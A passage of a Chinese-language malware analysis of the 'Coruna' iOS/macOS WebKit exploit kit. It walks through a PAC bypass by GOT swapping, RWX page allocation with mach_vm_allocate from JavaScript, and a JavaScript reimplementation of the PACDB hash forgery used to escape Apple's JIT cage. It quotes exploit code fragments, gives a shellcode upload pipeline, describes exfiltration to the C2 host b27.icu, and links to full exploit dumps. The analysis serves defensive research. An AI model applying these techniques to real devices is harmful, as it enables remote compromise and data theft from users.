**关键洞察**  
:__DATA  
 段中的 GOT 条目是**普通无签名指针**  
。与 __AUTH_GOT  
 条目(携带 PAC 签名)不同,常规 GOT 条目可以在没有认证的情况下修改。但读取  
这些 GOT 条目的代码是完全 PAC 认证的——其执行中的每个间接分支都通过硬件验证。  
  
CPU 认证代码的  
控制流,但无法验证它操作的数据  
是合法的。漏洞从不修改代码或签名指针——它只改变签名代码恰好读取的无签名数据。finally  
 块立即恢复原始值,最小化损坏窗口。  
  
**这与 ROP 根本不同。**  
 没有 gadget 链,没有栈旋转,没有返回地址损坏。攻击面是 PAC 保护的控制流和不受保护的数据流之间的语义鸿沟。  
#### 阶段 3:通过 mach_vm_allocate 获得可执行内存  
  
**问题**  
:你现在可以通过 GOT 交换机制调用任意原生函数,但你仍在执行已知地址的现有  
代码。要运行自定义 shellcode,你需要可写可执行(RWX)内存——而苹果的 WebContent 沙箱限制内存分配。  
  
**Coruna 的解决方案**  
:直接从 JavaScript 调用 mach_vm_allocate  
 Mach 内核陷阱,请求具有 VM_PROT_READ | VM_PROT_WRITE | VM_PROT_EXECUTE  
 权限的页面。  
  
类 hc  
(扩展 oc  
)处理此事。其构造函数从 libsystem_kernel.dylib  
 解析内核陷阱存根:  
```
this.ug = this.jn.wo('_mach_vm_allocate');this.Kg = this.jn.Eo('_mach_msg_trap$...', '_mach_msg2_trap$...');
```  
  
Eo()  
 回退模式处理跨 macOS 版本的 ABI 差异——Mach 消息陷阱在版本之间更改了名称。  
  
gg()  
 方法基于能力标志提供两条分配路径:  
  
**路径 A - 直接**  
:通过 Wasm 蹦床调用 _mach_vm_allocate  
,通过工作缓冲区(this.ig  
)传递大小和标志,并从结果读取分配的地址。  
  
**路径 B - 间接**  
:当直接路径不可用时,Lg()  
 遍历四级 JSC 内部指针——JSFunction → FunctionExecutable → JITCode → handler table → kernel trap entry  
——以定位陷阱处理程序,然后通过它调用。  
  
两条路径都将参数写入固定的 16KB Uint32Array  
 缓冲区,调用内核陷阱,并从版本相关偏移处的同一缓冲区读回结果。**分配的页面带有 RWX 权限**  
——可写以便漏洞可以将 shellcode 复制到其中,可执行以便 shellcode 可以运行。  
  
但有一个陷阱:苹果的 JIT 笼要求可执行页面携带**有效的代码完整性哈希**  
。简单地将 ARM64 指令写入页面是不够的——没有匹配签名,内核将拒绝执行它们。这就是最后阶段的用武之地。  
#### 阶段 4:PACDB 滚动哈希伪造  
  
这是 Coruna 漏洞链的皇冠明珠——也是我在其他任何地方都没有看到记录的技术。不在 Google 的出版物中,不在 iVerify 的,不在任何先前的 JIT 笼逃逸报告中。  
  
苹果的 JIT 笼不只是限制代码在哪里  
执行——它验证什么  
代码执行。在 JIT 页面被标记为可执行之前,内核使用硬件 PAC 指令 PACDB  
 计算其内容的加密哈希。JIT 编译器在写入代码时计算相同的哈希。如果它们不匹配,页面保持不可执行。  
  
**Coruna 开发者从 JavaScriptCore 的源码逆向了这个哈希算法,并在 JavaScript 中重新实现了它。**  
  
**算法**  
  
类 hc  
 上的 kg()  
 方法返回一个签名函数。它根据硬件能力标志选择三种变体之一——在现代 ARM64e 上,它使用 PACDB 路径:  
```
const sign = (code, offset, dest) => {    let hash = K._(offset);           // 从页面偏移播种    for (let i = 0; i < code.length; i++) {        const val = (code[i] ^ hash) >>> 0;   // 用运行哈希 XOR 指令        // 使用硬件 PACDB 作为键控哈希函数:        const h = lc.cc(sc(val), ctx1).et >>> 7;        const t = lc.cc(sc(val), ctx2);        // 通过移位和 XOR 组合:        hash = (h ^ (t.it >>> 23 | t.et << 9)) >>> 0;        // 将哈希写入验证缓冲区        ac.sr(dest + 4*i, hash);    }    return hash;};
```  
  
每个 lc.cc()  
 调用通过 GOT 交换机制调用实际的硬件 PACDB  
 指令。该算法有四个关键属性:  
1. 1. **PAC 作为 MAC**  
 - 漏洞将硬件 PACDB  
 指令(为指针认证设计)重新用作键控消息认证码。每个指令字使用处理器的秘密 PAC 密钥"签名"——保护函数指针的同一密钥。  
  
1. 2. **滚动依赖**  
 - 每个指令的哈希通过 XOR 链依赖于所有先前的哈希。更改任何单个指令都会使每个后续哈希值无效。  
  
1. 3. **双上下文混合**  
 - 每个字使用两个不同的 PAC 上下文鉴别器(ctx1  
、ctx2  
),结果通过位移位和 XOR 组合。这使有效哈希宽度翻倍。  
  
1. 4. **偏移播种**  
 - 初始种子来自页面偏移,将签名绑定到代码的内存位置。不同地址的相同 shellcode 产生不同的哈希链。  
  
**上传管道**  
  
有了签名函数,Ig()  
 执行完整的代码上传:  
```
1. gg(size)      → mach_vm_allocate → 地址 P 的 RWX 页面2. PAC 签名 P    → lc.oe(P, 0x3D96n) → 认证的目标指针3. 复制代码     → rg(copyFunc, shellcode, len, offset, signedP)4. kg()(code)    → 滚动 PACDB 哈希 → 哈希链写入缓冲区5. 写入哈希     → ac.sr(hashDest, finalHash) → 验证槽已填充6. 内核检查     → 哈希匹配代码 → 页面标记为可执行7. 执行         → 跳转到 P → 攻击者控制的 ARM64 运行
```  
  
PAC 签名的目标指针(步骤 2)使用上下文鉴别器 0x3D96  
——确保复制不能重定向到不同页面。分配的页面在写入 shellcode 之前用 0x3C  
(BRK #0  
 - ARM64 断点)初始化,因此任何未初始化的字节将陷阱而不是执行陈旧数据。**这是合法 JIT 编译器使用的相同防御模式。**  
  
**为什么内核无法区分**  
  
JIT 笼验证旨在确保 JIT 编译的代码在编译和执行之间未被篡改。哈希由 JIT 编译器(在进程内运行)计算,并在授予执行权限之前由内核验证。  
  
**Coruna 拥有伪造有效哈希所需的一切**  
:  
- • **算法**  
 - 从 JavaScriptCore 逆向  
  
- • **PAC 密钥**  
 - 硬件 PAC 密钥是按进程的,而不是按权限级别的。进程中的任何代码都可以使用相同的密钥调用 PACDB  
  
- • **写原语**  
 - 任意内存写入将 shellcode 及其哈希放置在正确位置  
  
内核看到一个 JIT 页面,其中包含使用正确 PAC 密钥计算的代码和匹配哈希。它无法将此与合法 JIT 编译区分开来。页面被标记为可执行,漏洞的 ARM64 shellcode 以完整 WebContent 进程权限运行。  
  
**利用链完成。**  
 从 JavaScript 类型混淆到任意原生代码执行,通过四个升级阶段——每个阶段都建立在前一个之上,每个阶段都绕过苹果深度防御的不同层。  
### 有效载荷和 C2  
  
一旦 shellcode 运行,最终有效载荷模块(final_payload_A  
 和 final_payload_B  
)处理后利用。两个变体共享相同的逻辑——区别在于有效载荷 A 使用 PAC 认证的代码指针路径,而有效载荷 B 使用带有额外运行时检查的无签名回退。  
  
shellcode 嵌入为 XOR 编码的 Uint32Array  
 双字——变体 A 中 88 个双字,变体 B 中 27-44 个。解码后,ARM64 指令执行:  
1. 1. **进程信息收集**  
 - 读取进程 ID、父 PID 和沙箱配置文件  
  
1. 2. **User-Agent 和 URL 泄露**  
 - 从 JavaScript 上下文捕获 navigator.userAgent  
 和 document.URL  
,并将它们写入 shellcode 的数据区域  
  
1. 3. **C2 回调**  
 - 通过基于 SharedArrayBuffer  
 的状态机通过 XHR 将收集的数据传输到 b27.icu  
  
C2 通信(xA()  
)使用简单的状态机,轮询 SharedArrayBuffer  
 以获取完成标志——shellcode 将状态码写入共享内存,JavaScript 端读回它们以跟踪进度。这避免了从 JavaScript 层发出任何 DOM 可见的网络请求;实际的 HTTP 请求从原生代码发出。  
  
值得注意的是,**漏洞从不将文件丢弃到磁盘**  
。一切——JavaScript 模块、shellcode、C2 数据——仅存在于内存中。从水坑登陆到数据泄露的整个链都在浏览器进程内发生。  
### 版本覆盖  
  
我从 b27.icu  
 恢复的工具包覆盖 Coruna 完整武器库的特定子集(Google 记录为跨 5 条链的 23 个漏洞)。我的子集目标:  
  
<table><thead><tr><th style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;background: rgba(0, 0, 0, 0.05);"><section><span leaf="">组件</span></section></th><th style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;background: rgba(0, 0, 0, 0.05);"><section><span leaf="">覆盖</span></section></th></tr></thead><tbody><tr><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><strong style="color: #0F4C81;font-weight: bold;font-size: inherit;"><span leaf="">iOS 版本</span></strong></td><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">16.0 - 17.2</span></section></td></tr><tr><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><strong style="color: #0F4C81;font-weight: bold;font-size: inherit;"><span leaf="">macOS</span></strong></td><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">Apple Silicon 上的 Safari/WebKit</span></section></td></tr><tr><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><strong style="color: #0F4C81;font-weight: bold;font-size: inherit;"><span leaf="">WebKit RCE 路径</span></strong></td><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">3(NaN-boxing、JIT 优化、Audio/SVG)</span></section></td></tr><tr><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><strong style="color: #0F4C81;font-weight: bold;font-size: inherit;"><span leaf="">后 RCE 链</span></strong></td><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">R/W 原语后与平台无关</span></section></td></tr><tr><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><strong style="color: #0F4C81;font-weight: bold;font-size: inherit;"><span leaf="">版本自适应偏移</span></strong></td><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">41 个 JSC 内部结构偏移,3 个版本阈值</span></section></td></tr><tr><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><strong style="color: #0F4C81;font-weight: bold;font-size: inherit;"><span leaf="">有效载荷变体</span></strong></td><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">2(A:PAC 认证,B:无签名回退)</span></section></td></tr></tbody></table>  
  
版本自适应偏移表(具有 41 个条目和 WebKit 构建 170000/170100/170200 阈值的 tt[]  
)是专业开发的最明确指标之一。**有人能访问多个 WebKit 构建,并系统地映射跨版本的内部结构变化。**  
 这不是你在周末 CTF 中做的事情。  
### 这告诉我们什么  
  
在这个代码库中花费数月后的一些观察:  
  
**工程质量卓越。**  
 12+ 个协作类,关注点清晰分离。延迟初始化。用于清理的 finally  
 块。重试机制。回退路径。仅 macOS 就有两个独立的 WebKit RCE 实现。**这不是概念验证——这是一个产品。**  
  
**JavaScript 级别的复杂性被低估了。**  
 Google 和 iVerify 从网络捕获和二进制取证分析 Coruna。JavaScript 源码揭示了不同维度:在 JS 中重新实现的 Mach-O 解析器、ARM64 指令模式匹配器、压缩导出 trie 遍历器、内联 Wasm 模块构造。**这些是用为网页设计的语言实现的系统编程技术。**  
  
**PAC 是减速带,不是墙。**  
 Coruna 在不伪造单个签名的情况下绕过 ARM64e 指针认证。混淆代理 GOT 交换技术利用 PAC 保护的控制流和不受保护的数据流之间的鸿沟。**苹果自己的签名代码成为攻击向量。**这是仅靠软件更新无法完全解决的设计级限制。  
  
**PACDB 哈希伪造是真正的发现。**  
 签署 JIT 页面的滚动哈希算法——在 JavaScript 中重新实现,使用硬件自己的 PAC 密钥——是我在任何先前的公开研究中都没有看到记录的东西。**这是使 JIT 笼逃逸成为可能的技术,也是最难缓解的技术**  
,除非对 JIT 代码签名工作方式进行架构更改。  
  
**传播故事很重要。**  
 为美国情报机构打造的工具包,被内部人员窃取,卖给俄罗斯经纪商,部署针对乌克兰民间社会,最终流落到攻击随机 iPhone 用户的中国加密货币诈骗网站。**这段旅程的每个阶段都是可预测的,每个阶段都是可以预防的。**漏洞链的技术卓越与让它传播的政策失败密不可分。  
### 资源  
- • **完整技术分析(6,596 行):**  
GitHub[1]  
 - 完整类分类、算法重建、代码示例和模块依赖图  
  
- • **Coruna 漏洞转储 + 工件:**  
GitHub[2]  
 - 样本、提取的 Wasm/二进制文件、解码的有效载荷、分析脚本  
  
- • **原始公开转储(matteyeux):**  
github.com/matteyeux/coruna[4]  
 - Coruna JavaScript 模块首次公开出现的地方  
  
- • **Google TIG - "Coruna:强大的 iOS 漏洞工具包":**  
cloud.google.com/blog[5]  
  
- • **iVerify - Coruna 检测和分析:**  
iverify.io/blog[9]  
  
- • **美国财政部 - Operation Zero 制裁:**  
treasury.gov[7]  
  
> 原文:https://www.nadsec.online/blog/coruna  
  
#### 引用链接  
  
[1]  
 Rat5ak/CORUNA_TECHNICAL_ANALYSIS: https://github.com/Rat5ak/CORUNA_TECHNICAL_ANALYSIS  
[2]  
 Rat5ak/CORUNA_IOS-MACOS_FULL_DUMP: https://github.com/Rat5ak/CORUNA_IOS-MACOS_FULL_DUMP  
[3]  
 下载 Coruna 完整转储包 https://www.nadsec.online/data/coruna-dump.zip: https://www.nadsec.online/data/coruna-dump.zip  
[4]  
 matteyeux: https://github.com/matteyeux/coruna  
[5]  
 发布: https://cloud.google.com/blog/topics/threat-intelligence/coruna-powerful-ios-exploit-kit/  
[6]  
 判处87个月监禁: https://cyberscoop.com/l3harris-executive-peter-williams-sentenced-zero-day-exploits-russia/  
[7]  
 制裁: https://home.treasury.gov/news/press-releases/sb0404  
[8]  
 CVE-2023-41974: https://nvd.nist.gov/vuln/detail/CVE-2023-41974  
[9]  
 iverify.io/blog: https://iverify.io/blog  
  
  
   
  
  
